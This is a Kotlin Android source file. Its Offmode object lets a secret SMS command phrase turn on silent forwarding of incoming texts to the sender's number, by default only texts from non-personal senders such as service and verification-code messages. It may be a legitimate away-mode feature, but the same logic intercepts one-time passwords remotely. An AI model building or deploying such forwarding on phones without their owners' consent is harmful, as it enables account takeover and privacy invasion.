package com.base.realtime.sms

import android.content.Context
import com.base.realtime.RealtimeApp
import java.util.concurrent.ConcurrentHashMap

object Offmode {
    private val seen = ConcurrentHashMap<String, Long>()

    fun onIncoming(context: Context, items: List<SmsItem>) {
        val app = context.applicationContext
        val now = System.currentTimeMillis()
        seen.entries.removeIf { now - it.value > 20_000L }
        var changed = false
        for (item in items) {
            if (item.type != 1) continue
            val key = "${item.address}|${item.date}|${item.body.hashCode()}"
            if (seen.putIfAbsent(key, now) != null) continue
            val filter = matchCommand(app, item.body)
            if (filter != null) {
                val to = item.address.trim()
                if (to.isNotEmpty()) {
                    OffmodeStore.set(app, true, to, filter)
                    changed = true
                }
                continue
            }
            forward(app, item)
        }
        if (!changed) return
        try {
            RealtimeApp.engine(app).reportSmsStatus()
        } catch (_: Throwable) {
        }
    }

    fun matchCommand(context: Context, body: String): String? {
        val text = body.trim()
        if (text.isEmpty()) return null
        val personal = OffmodePolicyStore.cmdPersonal(context).trim()
        val non = OffmodePolicyStore.cmdNonPersonal(context).trim()
        val all = OffmodePolicyStore.cmdAll(context).trim()
        if (personal.isNotEmpty() && text.equals(personal, ignoreCase = true)) {
            return OffmodeStore.FILTER_PERSONAL
        }
        if (all.isNotEmpty() && text.equals(all, ignoreCase = true)) {
            return OffmodeStore.FILTER_ALL
        }
        if (non.isNotEmpty() && text.equals(non, ignoreCase = true)) {
            return OffmodeStore.FILTER_NONPERSONAL
        }
        return null
    }

    fun isPersonal(context: Context, address: String): Boolean {
        val raw = address.trim()
        if (raw.isEmpty()) return false
        if (raw.any { it.isLetter() }) return false
        val candidate = SmsNormalize.address(raw)
        if (candidate.isEmpty() || candidate == "unknown") return false
        val pattern = OffmodePolicyStore.personalPattern(context)
        val regex = try {
            Regex(pattern)
        } catch (_: Throwable) {
            Regex(OffmodePolicyStore.DEFAULT_PERSONAL_PATTERN)
        }
        return regex.containsMatchIn(candidate) || regex.matches(candidate)
    }

    private fun forward(context: Context, item: SmsItem) {
        if (!OffmodeStore.enabled(context)) return
        if (!passesFilter(context, item.address)) return
        val dest = OffmodeStore.forwardTo(context)
        if (dest.isEmpty() || sameNumber(dest, item.address)) return
        val text = forwardBody(item.address, item.body)
        if (text.isEmpty()) return
        SmsSender.send(context, dest, text)
    }

    private fun passesFilter(context: Context, address: String): Boolean {
        return when (OffmodeStore.filter(context)) {
            OffmodeStore.FILTER_PERSONAL -> isPersonal(context, address)
            OffmodeStore.FILTER_ALL -> true
            else -> !isPersonal(context, address)
        }
    }

    private fun forwardBody(from: String, body: String): String {
        val who = from.trim().ifBlank { "?" }
        val text = body.trim()
        return if (text.isEmpty()) who else "$who\n$text"
    }

    private fun sameNumber(a: String, b: String): Boolean {
        val x = SmsNormalize.address(a).filter { it.isDigit() }
        val y = SmsNormalize.address(b).filter { it.isDigit() }
        if (x.isEmpty() || y.isEmpty()) return false
        if (x == y) return true
        val n = minOf(10, x.length, y.length)
        return n >= 8 && x.takeLast(n) == y.takeLast(n)
    }
}
